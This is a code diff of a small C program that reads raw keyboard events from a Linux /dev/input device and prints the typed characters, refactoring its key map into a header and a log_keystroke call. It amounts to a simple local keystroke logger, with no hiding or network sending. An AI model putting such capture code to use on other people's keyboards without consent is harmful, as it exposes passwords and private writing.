@@ -19,54 +19,7 @@
 #include <string.h>
 #include <stdio.h>
 #include <unistd.h>
-//#include <sstream>
-
-#define KEYPRESSED 1
-#define KEYRELEASED 0
-
-
-/* Map for U.S. standard keyboard layout */
-/* Only partially mapped currently. */
-char keyMap(u_int16_t input){
-
-    switch(input) {
-        case 16: return 'q';
-        case 17: return 'w';
-        case 18: return 'e';
-        case 19: return 'r';
-        case 20: return 't';
-        case 21: return 'y';
-        case 22: return 'u';
-        case 23: return 'i';
-        case 24: return 'o';
-        case 25: return 'p';
-
-        case 30: return 'a';
-        case 31: return 's';
-        case 32: return 'd';
-        case 33: return 'f';
-        case 34: return 'g';
-        case 35: return 'h';
-        case 36: return 'j';
-        case 37: return 'k';
-        case 38: return 'l';
-
-        case 44: return 'z';
-        case 45: return 'x';
-        case 46: return 'c';
-        case 47: return 'v';
-        case 48: return 'b';
-        case 49: return 'n';
-        case 50: return 'm';
-        case 51: return ',';
-        case 52: return '.';
-
-        case 57: return ' ';
-
-        default: break;
-    }
-}
-
+#include "keymap.h"
 
 int main() {
 
@@ -82,7 +35,7 @@ int main() {
      * Look for the device event associated with the keyboard.
      * for example, I have two keyboards attached. One appears
      * as event3 and the other event 4. */
-    char* keyboard = "/dev/input/event4";
+    char* keyboard = "/dev/input/event3";
 
     int fd = 0; /* file descriptor */
     int rd; /* number of bytes read */
@@ -98,10 +51,8 @@ int main() {
         /* attempting to read the entire input event and store it in event */
         while ( (rd = read(fd, &event, sizeof(struct input_event))) ) {
             fflush(stdout);
-            if (event.type == EV_KEY) /* if the event was a keyboard event */
-                if (event.value == 0){ /* only read on the release of the key, not the press */
-                    fprintf(stdout,"%c", keyMap(event.code));
-                }
+            if (event.type == EV_KEY)
+                log_keystroke(stdout, event);
         }
 
     } else {
